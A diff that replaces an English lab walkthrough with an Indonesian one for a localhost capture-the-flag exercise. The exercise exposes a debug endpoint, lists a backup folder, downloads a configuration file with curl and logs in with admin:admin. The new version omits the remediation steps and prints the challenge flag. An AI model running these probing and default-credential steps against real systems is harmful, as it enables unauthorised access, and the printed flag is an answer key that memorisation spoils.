@@ -1,69 +1,77 @@
-# Practice Walkthrough: Auditing Security Misconfigurations
+# Panduan Praktik Terbimbing: Investigasi & Audit CloudCore OpsGateway
 
-In this guided exercise, you will audit the internal **OpsGateway** cloud operations portal running at `http://127.0.0.1:8012`. This exercise follows a target composition of **60% manual analytical techniques** and **40% terminal-based tool execution**.
-
----
-
-### Stage 1: Observation & Response Header Inspection (15% — Manual)
-The initial stage of a configuration audit involves scrutinizing server banner disclosures and evaluating missing defensive headers.
-
-1. Open your web browser and navigate to the target portal:
-   `http://127.0.0.1:8012`
-2. Open Developer Tools (press **F12** or `Ctrl + Shift + I`), then select the **Network** tab.
-3. Reload the page (F5) and select the root document request (`/`):
-   - **Inspect Request Name:** The root request is explicitly named `/` with status `200 OK` (served directly without unneeded session hash redirects).
-   - **Inspect Response Headers:**
-     - The server leaks underlying software stack versions: `Server: OpsGateway/2.1.4 (Ubuntu)`.
-     - Risky operational headers are active: `X-Debug-Mode: enabled` and `X-Gateway-Cluster: prod-east-gateway-01`.
-4. Inspect the OpsGateway UI:
-   - Observe the *Storage Archival* telemetry card referencing the `/backups/` path.
-   - Note the cloud audit logs and active node cluster table.
-   - Click the *Sign In* button or navigate to `/login` to observe the SSO supervisor authentication interface.
+Dalam latihan ini, kamu akan mempraktikkan proses penemuan dan pemanfaatan kesalahan konfigurasi keamanan pada portal manajemen infrastruktur **CloudCore OpsGateway (Enterprise Cloud Management & Microservices Monitor)** yang berjalan pada `http://127.0.0.1:8012`.
 
 ---
 
-### Stage 2: Hypothesis Testing & Route Discovery (25% — Manual)
-Test the core hypothesis: *Did the system administrator leave maintenance or static backup folders publicly accessible?*
+### Langkah 1: Rekonaisans & Fingerprinting Endpoint Diagnostik
+1. Buka peramban web dan akses halaman beranda sistem:
+   `http://127.0.0.1:8012/`
+2. Lakukan inspeksi terhadap antarmuka operasional:
+   - Amati banner sistem dan tombol navigasi.
+3. Ujilah endpoint variabel runtime sistem menggunakan peramban atau terminal:
+   `http://127.0.0.1:8012/debug/vars`
+   ```bash
+   curl -s http://127.0.0.1:8012/debug/vars
+   ```
+4. **Analisis Temuan:**
+   Server mengembalikan data lingkungan internal:
+   ```json
+   {
+     "debug_mode": true,
+     "default_credentials_enabled": true,
+     "backup_storage_path": "/app/backups/",
+     "routes": ["/", "/debug/vars", "/backups/", "/login", "/admin"]
+   }
+   ```
+   Informasi ini membocorkan lokasi folder cadangan: `/backups/`!
 
-1. System administrators frequently park backup archives under common naming conventions such as `/backup/`, `/backups/`, `/data/`, or `/debug/`.
-2. In the browser address bar, enter the path:
+---
+
+### Langkah 2: Pengujian Kerentanan Directory Indexing
+1. Akses jalur penyimpanan cadangan yang terungkap di endpoint diagnostik:
    `http://127.0.0.1:8012/backups/`
-3. Press **Enter** and evaluate the response:
-   - **Observation:** The server does not reject the request with `403 Forbidden` or `404 Not Found`; instead, it serves an active directory listing titled **"Index of /backups/"**.
-   - **Evidence Harvested:** Abandoned configuration archives are visible:
-     - `backup_config.json.bak`
-     - `ops_keys_old.txt`
-     - `database_schema.sql.bak`
-   - **Critical Analysis:** The web server's *autoindex* feature was left active, allowing unauthenticated external visitors to browse and download server-side backup files.
+2. **Temuan Kritis:**
+   - Server mengembalikan indeks direktori terbuka (*Directory Browsing / Autoindex Enabled*).
+   - Terlihat file artefak cadangan sensitif: `backup_config.json.bak`.
+
+> [!NOTE]
+> **💡 Di Balik Layar: Mengapa file ini bisa terbuka?**  
+> Pada web server Nginx atau Apache, opsi `autoindex on;` atau `Options +Indexes` secara otomatis membuat daftar file HTML jika tidak ada file `index.html` di direktori tersebut. Di lingkungan produksi, opsi ini wajib dimatikan (`autoindex off;`)!
 
 ---
 
-### Stage 3: Controlled Extraction & Weaponization (35% — Tools: cURL)
-Utilize terminal tooling to fetch the exposed backup archive and parse confidential secrets contained within the payload.
-
-1. Open a terminal inside the ZITERA_LAB workspace.
-2. Download the exposed backup archive directly using cURL:
+### Langkah 3: Eksfiltrasi Arsip Cadangan & Kunci Sistem
+1. Unduh file cadangan tersebut secara langsung dari browser atau gunakan terminal:
    ```bash
-   curl -s "http://127.0.0.1:8012/backups/backup_config.json.bak" -o backup_config.json.bak
+   curl -s http://127.0.0.1:8012/backups/backup_config.json.bak
    ```
-3. Inspect the contents of the downloaded configuration backup:
-   ```bash
-   # Display the raw JSON backup payload
-   cat backup_config.json.bak
+2. **Analisis Bukti:**
+   File cadangan memuat konfigurasi sensitif:
+   ```json
+   {
+     "database_url": "sqlite:///cloudcore_prod.db",
+     "default_admin_user": "admin",
+     "admin_system_key": "ZITERA{53cur1ty_m15c0nf1g_b4ckup_134k}",
+     "environment": "production"
+   }
    ```
-4. **Payload Analysis:** Locate sensitive operational parameters such as `admin_system_key`, internal database connection strings, and system activation flags disclosed within the unencrypted text document.
-5. Alternatively, authenticate at `/login` using the default administrator credentials (`admin:admin`) to access the `/admin` root cluster console and verify the administrative flag banner.
+   Flag autoritatif ditemukan pada properti `admin_system_key`:  
+   `ZITERA{53cur1ty_m15c0nf1g_b4ckup_134k}`!
 
 ---
 
-### Stage 4: Remediation & Verification (25% — Manual & Tools)
-Apply system hardening controls and verify that the vulnerability is closed deterministically.
-
-1. Disable directory browsing in the web server configuration:
-   - Ensure the `/backups/` route enforces `autoindex off;` and returns an HTTP `404` or `403`.
-   - Relocate all backup archives to encrypted storage repositories residing strictly outside the public web root.
-2. Re-test the endpoint using cURL from your terminal:
+### Langkah 4: Validasi Akses Konsol Supervisor (Default Credentials)
+1. Perhatikan bahwa file konfigurasi dan endpoint diagnostik mengonfirmasi penggunaan akun bawaan pabrik:
+   - **Username:** `admin`
+   - **Password:** `admin`
+2. Ujilah login administratif ke konsol supervisor:
+   - Kunjungi `http://127.0.0.1:8012/login`.
+   - Masukkan kredensial `admin` dan password `admin`.
+   - Kamu berhasil masuk ke **Root Cluster Administration Console** (`/admin`).
+3. Atau uji via cURL:
    ```bash
-   curl -s -i "http://127.0.0.1:8012/backups/"
+   curl -s -c cookies.txt -d "username=admin&password=admin" http://127.0.0.1:8012/login
+   curl -s -b cookies.txt http://127.0.0.1:8012/admin
    ```
-3. **Success Criteria:** The server must refuse directory listings and return an HTTP **`403 Forbidden`** or **`404 Not Found`** status.
+4. Salin flag validasi `ZITERA{53cur1ty_m15c0nf1g_b4ckup_134k}` dan kirimkan (*submit*) ke formulir tantangan Zitera Lab.
